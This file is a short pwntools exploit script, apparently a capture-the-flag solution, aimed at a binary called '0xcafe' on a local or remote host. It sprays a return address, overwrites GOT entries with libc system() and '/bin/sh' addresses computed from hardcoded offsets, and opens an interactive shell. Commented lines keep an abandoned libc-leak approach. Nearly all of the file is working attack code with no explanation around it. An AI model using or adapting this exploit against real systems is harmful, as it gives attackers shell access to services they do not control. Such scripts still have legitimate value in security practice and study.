from pwn import *
import sys
import struct

LOCAL = True

HOST = '192.168.0.31'
PORT = 10001

def pad(s):
    return s + ("C" * (256-len(s)))


# one gadget 0xf7e7c065

def exploit(r):

    # infinite execution

    spray = pack(0x080485ab) * 64
    r.sendline(spray)
    #r.recvuntil("that!")

    system = 0xf7e7c140 - 0x5f140 + 0x003a940
    binsh = 0xf7e7c140 - 0x5f140 + 0x158e8b
    # spray GOT
    spray = pack(system) * 11 + pack(binsh) * 1 + pack(0x080485ab) * (64-11-1)
    r.sendline(spray)

    # data = r.recvuntil("that!")

    # data = r.recvuntil("MENU")
    # #print data

    # LEAKED_LIBC_PUT = struct.unpack("<I",data[(0x60-2):(0x60+2)])[0]
    # print 'puts  : ', hex(LEAKED_LIBC_PUT)

    # LIBC_PUT_OFFSET = 0x00062710
    # LIBC_SYSTEM_OFFSET = 0x0003c060

    # LIBC_BASE = LEAKED_LIBC_PUT - LIBC_PUT_OFFSET
    # LIBC_SYSTEM = LIBC_BASE+LIBC_SYSTEM_OFFSET

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) == 1:
        r = remote(HOST, PORT)
        exploit(r)
    else:
        r = process('./0xcafe')
        print util.proc.pidof(r)
        pause()
        exploit(r)
    

# 40 c1 e7 f7  66 84 04 08  0a 55 89 e5  a1 40 b0 04

#  40 c1 e7 f7  66 84 04 08  0a 55 89 e5  a1 40 b0 04  


# system 0xf7e7c140 - 0x5f140 + 0x003a940
# binsh 0xf7e7c140 - 0x5f140 + 0x158e8b